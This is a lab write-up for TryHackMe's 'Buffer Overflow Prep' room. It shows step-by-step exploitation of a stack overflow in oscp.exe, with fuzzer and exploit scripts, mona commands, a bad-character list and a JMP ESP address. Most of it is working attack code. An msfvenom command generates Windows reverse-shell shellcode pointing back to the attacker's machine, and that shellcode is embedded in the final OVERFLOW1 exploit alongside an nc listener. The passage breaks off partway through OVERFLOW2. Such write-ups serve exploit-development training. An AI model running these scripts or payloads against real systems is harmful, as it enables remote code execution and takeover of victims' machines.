# Buffer Overflow Prep

**Room Link:** [https://tryhackme.com/room/bufferoverflowprep](https://tryhackme.com/room/bufferoverflowprep)

## oscp.exe - OVERFLOW1

#### fuzzer.py

Slightly modified version of the script given.

```
#!/usr/bin/env python3

import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))
	timeout = 5
	prefix = "OVERFLOW1 "
	string = prefix + "A" * 100

	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)

except:
    print ("\nCould not connect!")
    sys.exit()

```



#### exploit.py

Slightly modified version of the script given.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW1 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

Login the the Windows box then open the oscp.exe within Immunity Debugger. Press the play button to start the program.

```
xfreerdp /u:admin /p:password /cert:ignore /v:$VICTIM /workarea
```

<figure><img src="../../.gitbook/assets/image (50) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11) (6) (1).png" alt=""><figcaption></figcaption></figure>

### **Crash Replication & Controlling EIP**

```
python fuzzer.py $VICTIM 1337
```

Program crashed at 2000 bytes with fuzzer.py

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 2000
```



#### **exploit.py - Code Changes #1**

I added the pattern\_create output into the payload variable.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW1 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

On kail run the exploit again then in mona run the following to get the offset for EIP. We were able to find the offset was 1978.

**Kali**

```
python exploit.py $VICTIM 1337
```

**Immunity Debugger**

```
!mona findmsp -distance 2000
```



<figure><img src="../../.gitbook/assets/image (44) (2).png" alt=""><figcaption></figcaption></figure>



**exploit.py - Code Changes #2**

```
import socket

ip = "10.10.95.4"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload=""
#payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```



**Kali**

After running the program again we now can fill EIP with our Bs so we now have control of EIP.

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (6) (4).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters

**Kali**

Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00\x07\x2e\xa0

```
python exploit.py $VICTIM 1337
```

#### **exploit.py - Code Changes #3**

```
import socket, time, sys

#bad chars found: \x00\x07\x2e\xa0
badchars = (
"\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW1 "
	offset = 1978
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = badchars
	#payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```



<figure><img src="../../.gitbook/assets/image (12) (4) (1).png" alt=""><figcaption><p>How to find the bad characters start location</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (15) (1) (2).png" alt=""><figcaption><p>Start location of bad characters</p></figcaption></figure>







### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll meets this criteria.&#x20;

**Immunity Debugger**

```
!mona modules
```

<figure><img src="../../.gitbook/assets/image (23) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with the first one which is 0x625011af but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.

**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

<figure><img src="../../.gitbook/assets/image (49) (1) (1).png" alt=""><figcaption></figcaption></figure>



### Exploit

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```

#### **exploit.py - Code Changes #4**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW1 "
	offset = 1978
	overflow = "A" * offset
	retn = "\xaf\x11\x50\x62"
	padding = "\x90" * 16
	payload = ("\xba\x16\x98\xb3\x39\xd9\xcd\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x53\x12\x03\x53\x12\x83\xd5\x9c\x51\xcc\x25\x74\x17"
"\x2f\xd5\x85\x78\xb9\x30\xb4\xb8\xdd\x31\xe7\x08\x95\x17\x04"
"\xe2\xfb\x83\x9f\x86\xd3\xa4\x28\x2c\x02\x8b\xa9\x1d\x76\x8a"
"\x29\x5c\xab\x6c\x13\xaf\xbe\x6d\x54\xd2\x33\x3f\x0d\x98\xe6"
"\xaf\x3a\xd4\x3a\x44\x70\xf8\x3a\xb9\xc1\xfb\x6b\x6c\x59\xa2"
"\xab\x8f\x8e\xde\xe5\x97\xd3\xdb\xbc\x2c\x27\x97\x3e\xe4\x79"
"\x58\xec\xc9\xb5\xab\xec\x0e\x71\x54\x9b\x66\x81\xe9\x9c\xbd"
"\xfb\x35\x28\x25\x5b\xbd\x8a\x81\x5d\x12\x4c\x42\x51\xdf\x1a"
"\x0c\x76\xde\xcf\x27\x82\x6b\xee\xe7\x02\x2f\xd5\x23\x4e\xeb"
"\x74\x72\x2a\x5a\x88\x64\x95\x03\x2c\xef\x38\x57\x5d\xb2\x54"
"\x94\x6c\x4c\xa5\xb2\xe7\x3f\x97\x1d\x5c\xd7\x9b\xd6\x7a\x20"
"\xdb\xcc\x3b\xbe\x22\xef\x3b\x97\xe0\xbb\x6b\x8f\xc1\xc3\xe7"
"\x4f\xed\x11\xa7\x1f\x41\xca\x08\xcf\x21\xba\xe0\x05\xae\xe5"
"\x11\x26\x64\x8e\xb8\xdd\xef\xbb\x36\x16\x5c\xd3\x44\xa8\xb2"
"\x78\xc0\x4e\xde\x90\x84\xd9\x77\x08\x8d\x91\xe6\xd5\x1b\xdc"
"\x29\x5d\xa8\x21\xe7\x96\xc5\x31\x90\x56\x90\x6b\x37\x68\x0e"
"\x03\xdb\xfb\xd5\xd3\x92\xe7\x41\x84\xf3\xd6\x9b\x40\xee\x41"
"\x32\x76\xf3\x14\x7d\x32\x28\xe5\x80\xbb\xbd\x51\xa7\xab\x7b"
"\x59\xe3\x9f\xd3\x0c\xbd\x49\x92\xe6\x0f\x23\x4c\x54\xc6\xa3"
"\x09\x96\xd9\xb5\x15\xf3\xaf\x59\xa7\xaa\xe9\x66\x08\x3b\xfe"
"\x1f\x74\xdb\x01\xca\x3c\xfb\xe3\xde\x48\x94\xbd\x8b\xf0\xf9"
"\x3d\x66\x36\x04\xbe\x82\xc7\xf3\xde\xe7\xc2\xb8\x58\x14\xbf"
"\xd1\x0c\x1a\x6c\xd1\x04")

	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (10) (1) (4).png" alt=""><figcaption></figcaption></figure>

## oscp.exe - OVERFLOW2

#### fuzzer.py

Slightly modified version of the script given.

```
#!/usr/bin/env python3

import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))
	timeout = 5
	prefix = "OVERFLOW2 "
	string = prefix + "A" * 100

	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)

except:
    print ("\nCould not connect!")
    sys.exit()

```

#### exploit.py

Slightly modified version of the script given.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW2 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

Login the the Windows box then open the oscp.exe within Immunity Debugger. Press the play button to start the program. The only difference we need to do is change our scripts prefix variable to point to OVERFLOW2

```
xfreerdp /u:admin /p:password /cert:ignore /v:$VICTIM /workarea
```



### **Crash Replication & Controlling EIP**

```
python fuzzer.py $VICTIM 1337
```

Program crashed at 700 bytes with fuzzer.py

<figure><img src="../../.gitbook/assets/image (12) (5).png" alt=""><figcaption></figcaption></figure>

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 700
```



#### **exploit.py - Code Changes #1**

I added the pattern\_create output into the payload variable.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW2 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
